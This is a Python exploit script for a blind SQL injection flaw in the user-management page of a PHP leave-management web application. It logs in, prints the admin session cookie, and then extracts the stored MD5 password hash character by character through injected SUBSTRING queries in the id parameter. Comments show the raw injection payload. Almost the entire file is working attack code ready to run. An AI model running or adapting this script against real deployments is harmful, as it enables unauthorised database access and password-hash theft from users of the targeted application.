# Blind SQL Injection Exploit for admin->user->manage_user.php
# Some code taken from:
# https://www.th3r3p0.com/random/python-requests-and-burp-suite.html
# https://bad-jubies.github.io/Blind-SQLi-1/
#
# Application: 
# https://www.sourcecodester.com/php/14551/online-leave-management-system-php-full-source-code-2020.html 
#
# Notes:
# Tested in windows 10 with xampp. Have to modify username, password, IP, proxies

import requests
import sys
from os import system
from time import sleep

def clear_screen():
    system("cls")

def login(IP, username, password, proxies):
    sess = requests.session()
    login_url = f"http://{IP}/leave_system/classes/Login.php?f=login"

    data = {
        "username":username,
        "password":password
    }

    login = sess.post(login_url, data=data, proxies=proxies, verify=False)

    if "success" in login.text:
        print("[+] Login succesful")
        print(f"[o] admin cookie: {sess.cookies['PHPSESSID']}")
        return sess
    else:
        print("[-] Login failed")
        sys.exit(1)

def exploit(sess, IP, proxies):
    md5Hash = ""
    charset = '0123456789abcdefghijklmnopqrstuvwxyz'

    print(f"\n[+] Bruteforcing MD5 hash: ") 

    for index in range(1, 33, 1):
        for char in charset:
            # In non url encoded form:
            # http://IP/leave_system/admin/?page=user/manage_user&id=1' AND SUBSTRING((SELECT PASSWORD FROM users WHERE id=1), 1, 1) = '0' -- -
            #
            # In python3 format strings:
            # http://IP/leave_system/admin/?page=user/manage_user&id=1' AND SUBSTRING((SELECT PASSWORD FROM users WHERE id={index}), {char}, 1) = '0' -- -
            URL = f"http://{IP}/leave_system/admin/?page=user/manage_user&id=1%27%20AND%20SUBSTRING((SELECT%20PASSWORD%20FROM%20users%20WHERE%20id=1),%20{index},%201)%20=%20%27{char}%27%20--%20-"
            req = sess.get(URL, proxies=proxies, verify=False)

            if "Invalid argument supplied for" in req.text:
                continue
            else:
                md5Hash += char
                print(md5Hash, end='\r',flush=False)
                sleep(0.5)
                break

    print(f"\n\n[+] Final Md5 hash: {md5Hash}")

if __name__ == "__main__":
    proxies = {
        "http":"http://127.0.0.1:8080",
        "https":"https://127.0.0.1:8080"
    }

    IP = '127.0.0.1'
    username = 'jsmith'
    password = 'password'

    clear_screen()
    sess = login(IP, username, password, proxies)
    exploit(sess, IP, proxies)